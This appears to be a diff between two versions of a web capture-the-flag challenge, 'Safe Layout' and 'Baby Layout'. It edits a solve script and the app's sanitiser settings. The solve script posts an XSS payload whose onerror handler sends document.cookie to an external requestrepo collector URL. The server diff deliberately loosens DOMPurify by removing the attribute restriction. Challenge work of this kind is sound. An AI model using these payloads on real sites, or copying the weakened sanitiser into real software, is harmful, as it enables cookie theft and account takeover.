@@ -1,0 +1,103 @@
+diff --git a/sol.py b/sol.py
+index eaaee2f..6dcdc62 100644
+--- a/sol.py
++++ b/sol.py
+@@ -1,12 +1,12 @@
+ import requests
+ 
+-WEB_URL = 'http://1.95.132.78:3000'
+-BOT_URL = 'http://1.95.132.78:1337'
++WEB_URL = 'http://1.95.153.158:3000'
++BOT_URL = 'http://1.95.153.158:1337'
+ ATTACKER_URL = 'https://ol1q3yh0.requestrepo.com'
+ 
+ session = requests.session()
+ 
+-layout = 'a<style>{{content}}<{{content}}</style>'
++layout = '<img src="{{content}}">'
+ res = session.post(f'{WEB_URL}/api/layout', json={ 'layout': layout })
+ if not res.ok:
+     print(res.text)
+@@ -14,7 +14,7 @@
+ layoutId = res.json()['id']
+ 
+ res = session.post(f'{WEB_URL}/api/post', json={
+-    'content': f'img src onerror=fetch(`{ATTACKER_URL}/`+document.cookie) <style></style>',
++    'content': f'<div title=" onerror=fetch(`{ATTACKER_URL}/`+document.cookie) x="></div>',
+     'layoutId': layoutId,
+ })
+ if not res.ok:
+diff --git a/src/bot/public/index.html b/src/bot/public/index.html
+index e6de09a..ded01e7 100644
+--- a/src/bot/public/index.html
++++ b/src/bot/public/index.html
+@@ -4,12 +4,12 @@
+ <head>
+   <meta charset="UTF-8" />
+   <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@2/css/pico.min.css" crossorigin="anonymous">
+-  <title>Admin Bot - Safe Layout</title>
++  <title>Admin Bot - Baby Layout</title>
+ </head>
+ 
+ <body>
+   <main class="container">
+-    <h1>Admin Bot - Safe Layout</h1>
++    <h1>Admin Bot - Baby Layout</h1>
+     <label for="post">Post ID</label>
+     <input type="text" id="post" placeholder="c62603f073853407ed783e570e8d9399" required />
+     <button id="report" aria-busy="false">Report</button>
+diff --git a/src/web/index.js b/src/web/index.js
+index d3cfad1..2b03c64 100644
+--- a/src/web/index.js
++++ b/src/web/index.js
+@@ -66,7 +66,7 @@ app.post('/api/post', (req, res) => {
+   const layout = req.session.layouts[layoutId];
+   if (layout === undefined) return res.status(400).send('Layout not found');
+ 
+-  const sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] });
++  const sanitizedContent = DOMPurify.sanitize(content);
+   const body = layout.replace(/\{\{content\}\}/g, () => sanitizedContent);
+ 
+   if (body.length > LENGTH_LIMIT) return res.status(400).send('Post too long');
+@@ -85,7 +85,7 @@ app.post('/api/layout', (req, res) => {
+   if (typeof layout !== 'string') return res.status(400).send('Invalid param');
+   if (layout.length > LENGTH_LIMIT) return res.status(400).send('Layout too large');
+ 
+-  const sanitizedLayout = DOMPurify.sanitize(layout, { ALLOWED_ATTR: [] });
++  const sanitizedLayout = DOMPurify.sanitize(layout);
+ 
+   const id = req.session.layouts.length;
+   req.session.layouts.push(sanitizedLayout);
+diff --git a/src/web/views/home.ejs b/src/web/views/home.ejs
+index d561ba2..a0d692f 100644
+--- a/src/web/views/home.ejs
++++ b/src/web/views/home.ejs
+@@ -3,13 +3,13 @@
+ 
+ <head>
+   <meta charset="UTF-8">
+-  <title>Safe Layout</title>
++  <title>Baby Layout</title>
+   <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@2/css/pico.min.css" crossorigin="anonymous">
+ </head>
+ 
+ <body>
+   <main class="container">
+-    <h1>Safe Layout</h1>
++    <h1>Baby Layout</h1>
+ 
+     <section>
+       <h2>Create New Post</h2>
+diff --git a/src/web/views/post.ejs b/src/web/views/post.ejs
+index 9540db8..cf44f28 100644
+--- a/src/web/views/post.ejs
++++ b/src/web/views/post.ejs
+@@ -3,7 +3,7 @@
+ 
+ <head>
+   <meta charset="UTF-8">
+-  <title><%= id.substring(0, 7) %> - Safe Layout</title>
++  <title><%= id.substring(0, 7) %> - Baby Layout</title>
+   <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@2/css/pico.min.css" crossorigin="anonymous">
+ </head>
+ 
